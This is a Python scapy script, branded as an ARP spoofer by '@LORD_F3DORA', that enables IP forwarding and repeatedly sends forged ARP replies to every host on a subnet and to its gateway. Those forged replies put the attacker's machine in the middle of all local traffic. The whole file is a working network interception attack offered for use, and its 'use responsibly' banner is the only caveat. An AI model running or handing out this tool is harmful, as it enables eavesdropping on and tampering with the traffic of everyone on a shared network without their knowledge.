from scapy.all import *
import time
import os
from colorama import Fore, Style, init

def display():
    print(Fore.GREEN + "            #######################################")
    print(Fore.GREEN + "            #######################################")
    print(Fore.GREEN + "            #######################################")
    print("            WELCOME TO ARP SPOOFER BY @LORD_F3DORA  ")
    print(Fore.GREEN + "            #######################################")
    print(Fore.GREEN + "            !!! Use responsibly and legally !!!")
    print(Fore.GREEN + "            #######################################")
    print(Fore.GREEN + "            #######################################")
    print(Fore.GREEN + "            #######################################")
    
display()

# Prompt user for network parameters
gateway_ip = input("Enter the gateway IP address: ")
interface = input("Enter the network interface (e.g., eth0, wlan0): ")

# Enable IP forwarding
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("IP forwarding is now enabled.")

# ARP Spoof function
def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, iface=interface, verbose=0)

# Spoof all devices on the subnet
try:
    print("Starting ARP spoofing attack. Press Ctrl+C to stop.")
    while True:
        for ip in range(2, 255):
            target_ip = f"{gateway_ip.rsplit('.', 1)[0]}.{ip}"
            arp_spoof(target_ip, gateway_ip)  # Tell target that the gateway is at attacker's MAC
            arp_spoof(gateway_ip, target_ip)  # Tell gateway that target is at attacker's MAC
        time.sleep(2)  # Delay to avoid flooding
except KeyboardInterrupt:
    print("\nStopping ARP spoofing attack.")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # Disable IP forwarding
    print("IP forwarding disabled.")
